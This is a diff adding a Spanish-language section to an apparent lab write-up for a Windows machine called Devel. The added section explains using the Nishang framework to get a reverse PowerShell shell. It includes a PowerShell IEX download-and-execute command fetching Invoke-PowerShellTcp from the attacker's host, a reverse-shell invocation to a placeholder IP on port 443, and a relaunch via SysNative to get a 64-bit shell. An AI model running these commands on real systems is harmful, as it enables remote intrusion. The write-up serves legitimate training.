@@ -153,6 +153,53 @@ lo ejecutamos y estamos dentro
 
 > https://github.com/samratashok/nishang
 
+Nishang es un framework de scripts y payloads para windows, especificamente para activar y usar la PowerShell que siempre es mas recomendable que el cmd.
+
+primero hay que clonar en nuestro sistema el nishang
+
+```Python
+root@kali:/opt# git clone https://github.com/samratashok/nishang.git
+Cloning into 'nishang'...
+remote: Enumerating objects: 1660, done.
+remote: Total 1660 (delta 0), reused 0 (delta 0), pack-reused 1660
+Receiving objects: 100% (1660/1660), 6.62 MiB | 23.70 MiB/s, done.
+Resolving deltas: 100% (1040/1040), done.
+```
+
+luego hay que copiar **InvokePowerShellTcp.ps1** desde **/opt/nishang/Shells/**.
+
+> escribimos en **InvokePowerShellTcp.ps1** en el final lo siguiente:
+>> Invoke-PowerShellTcp -Reverse -IPAddress MiIp -Port 443
+
+lo subimos a la maquina y lo ejecutamos escribriendo el siguiente comando.
+
+> start /b powershell IEX(New-Object Net.WebClient).downloadString('http://MyIpLoco:Puerto/InvokePowerShellTcp.ps1')
+
+> recordar que son 2 sesiones diferentes de netcat. ojito.
+
+listop, ahi tendriamos acceso a una powerShell. **PERO** muchas de las cosas que nos salen podrian ser falsos positivios.
+
+Para evitar esto podemos hacer lo siguiente:
+```Python
+[Environment]::Is64BitsOperatingSystem //si es true entonces tamos bien
+```
+
+```Python
+[Environment]::Is64BitsProcess
+```
+> si es falso, este proceso de shell es de 32bits, por lo que tenemos que migrar a mano a un proceso de 64 bits si o si debemos migrar
+
+```start /b C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe IEX(New-Object Net.webClient).downloadString('http://MyIpAdrress:8000/Invoke_PowerShellTCP.ps1')```
+
+> recordar que tenemos que tener una session de netcat en el puerto 443 abierta.
+
+con esto logramos crear una powerShell que trabaje en 64bits, por lo que volvemos a lanzar un netcat para obtener la reverse shell otra vez
+
+> preguntamos otra vez :
+>> ```[Environment]::Is64BitsProcess```
+
+una vez que es true podemos continuar y no van a darnos falsos positivos
+
 #### root
 con un systeminfo obtenemos la version de la maquina: 
 ![](/TheusZero/images/post/WindowsMachines/Devel/8.png)
